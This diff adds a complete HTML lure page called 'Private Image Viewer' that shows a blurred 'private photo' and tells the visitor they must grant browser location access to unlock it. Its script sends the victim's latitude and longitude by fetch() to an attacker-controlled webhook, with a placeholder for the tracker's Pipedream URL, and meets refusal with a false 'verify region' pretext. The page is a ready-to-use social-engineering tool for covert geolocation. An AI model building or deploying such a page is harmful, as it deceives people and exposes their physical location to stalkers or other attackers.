@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Private Image Viewer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #111; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px; }
+        #bait { width: 90%; max-width: 400px; border-radius: 10px; filter: blur(15px); transition: 0.5s; }
+        .btn { background: #25d366; border: none; padding: 15px 30px; color: white; border-radius: 5px; font-size: 18px; margin-top: 20px; cursor: pointer; font-weight: bold;}
+    </style>
+</head>
+<body>
+    <h2>You received a private photo</h2>
+    <p>Click below to unlock and view</p>
+    <img src="bait.jpg" id="bait"> <br>
+    <button class="btn" onclick="getLocation()">Unlock & View Photo</button>
+
+    <script>
+        const gate = "PASTE_YOUR_PIPEDREAM_URL_HERE";
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            }
+        }
+
+        function showPosition(position) {
+            // Sends location to you
+            fetch(gate + "?lat=" + position.coords.latitude + "&lon=" + position.coords.longitude);
+            // Unblurs the image
+            document.getElementById("bait").style.filter = "none";
+        }
+
+        function showError(error) {
+            alert("Location access required to verify region and view this content.");
+        }
+    </script>
+</body>
+</html>
